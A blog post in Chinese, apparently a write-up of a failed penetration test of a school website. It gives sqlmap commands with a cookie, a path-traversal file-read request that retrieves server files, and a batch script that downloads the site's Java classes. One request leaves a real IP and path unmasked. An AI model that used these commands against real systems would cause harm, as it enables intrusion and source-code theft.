@@ -1,0 +1,358 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>记一次失败的渗透edu网站 | Montez1</title><meta name="author" content="Monte Zayn"><meta name="copyright" content="Monte Zayn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="https:&#x2F;&#x2F;monte.us.kg&#x2F;posts&#x2F;8c29dab3  中华人民共和国网络安全法第十二条第二款任何个人和组织使用网络应当遵守宪法法律,遵守公共秩序,尊重社会公德,不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义,宣扬民族仇恨、民族歧视,传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次失败的渗透edu网站">
+<meta property="og:url" content="https://monte.us.kg/posts/8c29dab3.html">
+<meta property="og:site_name" content="Montez1">
+<meta property="og:description" content="https:&#x2F;&#x2F;monte.us.kg&#x2F;posts&#x2F;8c29dab3  中华人民共和国网络安全法第十二条第二款任何个人和组织使用网络应当遵守宪法法律,遵守公共秩序,尊重社会公德,不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义,宣扬民族仇恨、民族歧视,传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://t00img.yangkeduo.com/chat/images/2024-08-01/c3d9822ea3892f64b02794d460b95d77.png">
+<meta property="article:published_time" content="2024-07-21T02:47:30.000Z">
+<meta property="article:modified_time" content="2024-08-03T11:24:16.779Z">
+<meta property="article:author" content="Monte Zayn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://t00img.yangkeduo.com/chat/images/2024-08-01/c3d9822ea3892f64b02794d460b95d77.png"><link rel="shortcut icon" href="https://t00img.yangkeduo.com/chat/images/2024-08-01/c3d9822ea3892f64b02794d460b95d77.png"><link rel="canonical" href="https://monte.us.kg/posts/8c29dab3.html"><link rel="preconnect" href="//cdnjs.cloudflare.com"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "ngvpedf1f2");</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdnjs.cloudflare.com/ajax/libs/egjs-infinitegrid/4.11.1/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '记一次失败的渗透edu网站',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-03 19:24:16'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://t00img.yangkeduo.com/chat/images/2024-08-01/c3d9822ea3892f64b02794d460b95d77.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.dujin.org/bing/1366.php')"><nav id="nav"><span id="blog-info"><a href="/" title="Montez1"><span class="site-name">Montez1</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">记一次失败的渗透edu网站</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-21T02:47:30.000Z" title="发表于 2024-07-21 10:47:30">2024-07-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-03T11:24:16.779Z" title="更新于 2024-08-03 19:24:16">2024-08-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="记一次失败的渗透edu网站"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a href="https://monte.us.kg/posts/8c29dab3">https://monte.us.kg/posts/8c29dab3</a></p>
+<blockquote>
+<h2 id="中华人民共和国网络安全法"><a href="#中华人民共和国网络安全法" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h2><h3 id="第十二条第二款"><a href="#第十二条第二款" class="headerlink" title="第十二条第二款"></a>第十二条第二款</h3><p>任何个人和组织使用网络应当遵守宪法法律,遵守公共秩序,尊重社会公德,不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义,宣扬民族仇恨、民族歧视,传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p>
+<h3 id="第四十四条"><a href="#第四十四条" class="headerlink" title="第四十四条"></a>第四十四条</h3><p>任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p>
+<h3 id="第六十四条第二款"><a href="#第六十四条第二款" class="headerlink" title="第六十四条第二款"></a>第六十四条第二款</h3><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出告或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p>
+<p><strong>本文章仅供学习交流</strong></p>
+<p><strong>在本文章开始编写前，就已经提交了这些漏洞。</strong></p>
+</blockquote>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>用xray扫一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://t00img.yangkeduo.com/chat/images/2024-07-21/4b376390a3e9eae759b373a444809273.png"></p>
+<p>直接报出了SQL注入漏洞</p>
+<p>给sqlmap扫一下，提示302跳转到登录页面，再加上cookie试试：（*号屏蔽敏感内容）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -cookie <span class="string">&quot;cookie_****=****&quot;</span> -u <span class="string">&quot;http://***.com/***/jsp/main/ajaxAction!getReportClass.action?subject=132&amp;exam=20&amp;school=1&amp;grade=7&amp;type=0&amp;isHistory=F&amp;showSubjectL=F&quot;</span> -o -dbs</span><br></pre></td></tr></table></figure>
+
+<p>-o用来优化性能</p>
+<p>-dbs查询数据库</p>
+<p>这时候就不会302了，成功！</p>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://t00img.yangkeduo.com/chat/images/2024-07-21/aa7c3214980a9be03fe9d41b7ef6e96c.png" style="zoom:25%;" />
+
+<p>但是，这个数据库读取的效率太慢了，我读了一整天也没导出一个数据库</p>
+<h2 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h2><p>与此同时，通过抓包请求，我又注意到了一个任意文件读取漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1**.**.*.8:1***9/****/imageAction!getImageByFullUrl.action?fullImgUrl=C:\img\1.png</span><br></pre></td></tr></table></figure>
+
+<p>通过路径具有盘符，可知这是一个Windows系统</p>
+<p>把路径替换成其他的试试？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request GET <span class="string">&#x27;http://****.com:**/**/imageAction!getImageByFullUrl.action?fullImgUrl=C:/windows/notepad.exe&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Accept: */*&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Host: ****&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Connection: keep-alive&#x27;</span></span><br><span class="line"></span><br><span class="line">MZ?         ?       @                                   ?   ? ???L?This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">$       7?ws焧<span class="variable">$s</span>焧<span class="variable">$s</span>焧<span class="variable">$z</span>珑<span class="variable">$m</span>焧$聎%p焧$聀%`焧$聁%w焧$聈%n焧<span class="variable">$s</span>焨<span class="variable">$f</span>瀟$聕%i焧$聥<span class="variable">$r</span>焧$聉%r焧<span class="variable">$Richs</span>焧$                PE  d? j槈W        ? <span class="string">&quot; </span></span><br><span class="line"><span class="string">  ?  N     袊       @       </span></span><br><span class="line"><span class="string">省略</span></span><br></pre></td></tr></table></figure>
+
+<p>再替换成相对路径？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request GET <span class="string">&#x27;http://139.9.45.134:19999/edei/imageAction!getImageByFullUrl.action?fullImgUrl=../../index.jsp&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Accept: */*&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Host: 139.9.45.134:19999&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Connection: keep-alive&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html; charset=utf-8&quot;</span> language=<span class="string">&quot;java&quot;</span>	import=<span class="string">&quot;java.sql.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html; charset=utf-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> prefix=<span class="string">&quot;c&quot;</span>%&gt;</span><br><span class="line">省略</span><br></pre></td></tr></table></figure>
+
+<p>通过网页的错误报告，可知该网站是由Apache Tomcat搭建的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://t00img.yangkeduo.com/chat/images/2024-07-21/73f0e7da0e7981848d9c13eccc9b47ef.png"></p>
+<p>通过学习Apache Tomcat的文件分布，我编写了这个source.bat文件用来一键获取源码</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">SET</span> INPUT_PARAM=%<span class="number">1</span></span><br><span class="line">curl -o  C:\Users\Administrator\Documents\WEB-INF\classes\<span class="variable">%INPUT_PARAM:.=\%</span>.class --create-dirs http://***.com:***/****/imageAction!getImageByFullUrl.action?fullImgUrl=../../WEB-INF/classes/<span class="variable">%INPUT_PARAM:.=/%</span>.class</span><br></pre></td></tr></table></figure>
+
+<p>接着就可以通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source com.***.util.app.AppFilter.doFilter</span><br></pre></td></tr></table></figure>
+
+<p>取得class文件</p>
+<p>再放入jadx工具中反编译</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://t00img.yangkeduo.com/chat/images/2024-07-21/8de33b38ac273445a5ceda2983b1c29a.png"></p>
+<p>代码审计嘛。。</p>
+<p>审到了log文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://t00img.yangkeduo.com/chat/images/2024-07-21/a1ec99f0ff98ec169247f90a3f9b3726.png"></p>
+<p>得到了网站的绝对路径，谢谢你<del>胡桃</del>hutool</p>
+<p>再回到sqlmap中渗透（参数–os-shell）输入绝对路径，发现不行，一番查找之下发现mysql根本没开secure_file，草率了</p>
+<p>最后实在没希望了，就把这些漏洞提交了。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://monte.us.kg">Monte Zayn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://monte.us.kg/posts/8c29dab3.html">https://monte.us.kg/posts/8c29dab3.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://monte.us.kg" target="_blank">Montez1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/1f75e952.html" title="为histb海纳思系统盒子刷入2ray进行&quot;内网穿透&quot;"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">为histb海纳思系统盒子刷入2ray进行&quot;内网穿透&quot;</div></div></a></div><div class="next-post pull-right"><a href="/posts/4a262e6d.html" title="关于博客"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">关于博客</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://t00img.yangkeduo.com/chat/images/2024-08-01/c3d9822ea3892f64b02794d460b95d77.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Monte Zayn</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/montezl"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/montezl" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:meny233@vk.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is meny Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">中华人民共和国网络安全法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E6%9D%A1%E7%AC%AC%E4%BA%8C%E6%AC%BE"><span class="toc-number">1.1.</span> <span class="toc-text">第十二条第二款</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E6%9D%A1"><span class="toc-number">1.2.</span> <span class="toc-text">第四十四条</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%8D%81%E5%9B%9B%E6%9D%A1%E7%AC%AC%E4%BA%8C%E6%AC%BE"><span class="toc-number">1.3.</span> <span class="toc-text">第六十四条第二款</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">任意文件读取漏洞</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/0.html" title="无题">无题</a><time datetime="2024-08-04T07:58:18.371Z" title="发表于 2024-08-04 15:58:18">2024-08-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/1f75e952.html" title="为histb海纳思系统盒子刷入2ray进行&quot;内网穿透&quot;">为histb海纳思系统盒子刷入2ray进行&quot;内网穿透&quot;</a><time datetime="2024-07-21T08:21:52.000Z" title="发表于 2024-07-21 16:21:52">2024-07-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/8c29dab3.html" title="记一次失败的渗透edu网站">记一次失败的渗透edu网站</a><time datetime="2024-07-21T02:47:30.000Z" title="发表于 2024-07-21 10:47:30">2024-07-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/4a262e6d.html" title="关于博客">关于博客</a><time datetime="2024-07-20T03:40:45.000Z" title="发表于 2024-07-20 11:40:45">2024-07-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Monte Zayn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><a href="https://icp.gov.moe/?keyword=20241717" target="_blank">萌ICP备20241717号</a>
+<img style="width:20px;height:20px;margin-bottom:-4px" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://t.xnn.gs/file/29cdf7c58972d81ee6ac8.jpg"><a href="https://nyaicp.xyz/?id=20241111" target="_blank">喵喵ICP备案 20241111号</a>
+<img style="width:20px;height:20px;margin-bottom:-4px" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://krseoul.imgtbl.com/i/2024/07/01/66825b0a53d19.jpg"> <a href="https://icp.kldhsh.top/?id=666666" target="_blank">开朗ICP备案 666666号</a></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.umd.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-lazyload/17.8.8/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>(()=>{
+  const getGiscusTheme = theme => {
+    return theme === 'dark' ? 'dark' : 'light'
+  }
+
+  const loadGiscus = () => {
+    const config = Object.assign({
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'montezl/Blog',
+      'data-repo-id': 'R_kgDOMYVbEA',
+      'data-category-id': 'DIC_kwDOMYVbEM4ChC5v',
+      'data-mapping': 'pathname',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true
+    },null)
+
+    const ele = document.createElement('script')
+    for (let key in config) {
+      ele.setAttribute(key, config[key])
+    }
+    document.getElementById('giscus-wrap').appendChild(ele)
+  }
+
+  const changeGiscusTheme = theme => {
+    const sendMessage = message => {
+      const iframe = document.querySelector('iframe.giscus-frame')
+      if (!iframe) return
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app')
+    }
+
+    sendMessage({
+      setConfig: {
+        theme: getGiscusTheme(theme)
+      }
+    });
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if ('Giscus' === 'Giscus' || !true) {
+    if (true) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment= loadGiscus
+  }
+})()</script></div><script src="https://cdnjs.cloudflare.com/ajax/libs/pjax/0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["link[rel=\"canonical\"]","meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
